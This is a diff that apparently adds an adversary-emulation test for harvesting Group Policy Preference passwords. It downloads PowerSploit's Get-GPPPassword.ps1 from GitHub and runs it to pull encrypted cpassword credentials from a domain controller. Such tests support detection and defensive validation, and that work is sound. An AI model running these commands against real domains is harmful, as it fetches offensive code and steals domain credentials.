@@ -1,0 +1,14 @@
+#TechniqueName: Unsecured Credentials: Group Policy Preferences
+#AtomicTestName: GPP Passwords (Get-GPPPassword)
+#Description: Look for the encrypted cpassword value within Group Policy Preference files on the Domain Controller.&This test is intended to be run from a domain joined workstation, not on the Domain Controller itself.&The Get-GPPPasswords.ps1 executed during this test can be obtained using the get-prereq_commands.&&Successful test execution will either display the credentials found in the GPP files or indicate "No preference files found".&
+#Language: ps1
+
+#get_prereq_commands
+New-Item -ItemType Directory (Split-Path "PathToAtomicsFolder\T1552.006\src\Get-GPPPassword.ps1") -Force | Out-Null
+Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/87630cac639f29c2adcb163f661f02890adf4bdd/Exfiltration/Get-GPPPassword.ps1 -OutFile "PathToAtomicsFolder\T1552.006\src\Get-GPPPassword.ps1"
+
+
+#commands
+. PathToAtomicsFolder\T1552.006\src\Get-GPPPassword.ps1
+Get-GPPPassword -Verbose
+
